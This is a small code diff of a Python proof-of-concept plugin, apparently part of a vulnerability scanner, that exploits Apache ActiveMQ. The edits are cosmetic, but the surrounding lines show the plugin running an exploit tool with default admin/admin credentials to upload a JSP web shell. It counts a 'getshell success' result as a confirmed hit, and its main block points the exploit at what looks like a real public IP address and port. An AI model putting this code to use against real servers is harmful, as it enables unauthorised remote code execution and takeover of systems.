@@ -48,13 +48,13 @@ class P(T):
                    ' -url '+targeturl+' -user admin -pass admin'+\
 		   ' -shell '+os.path.split(os.path.realpath(__file__))[0]+'/script/shell.jsp'
         try:
-            print usecommand
+            # print usecommand
             msgresult = command(usecommand, timeout=20)
             print msgresult
             if 'getshell success' in msgresult:
                 result['result']=True
                 result['VerifyInfo'] = {}
-                result['VerifyInfo']['type']='ActiveMQ   vul'
+                result['VerifyInfo']['type']='ActiveMQ vul'
                 result['VerifyInfo']['URL'] =ip+':'+port
                 result['VerifyInfo']['payload']='ActiveMQ poc'
                 result['VerifyInfo']['result'] =msgresult
@@ -66,5 +66,6 @@ class P(T):
         finally:
 
             return result
+
 if __name__ == '__main__':
     print P().verify(ip='124.160.12.83',port='8087')
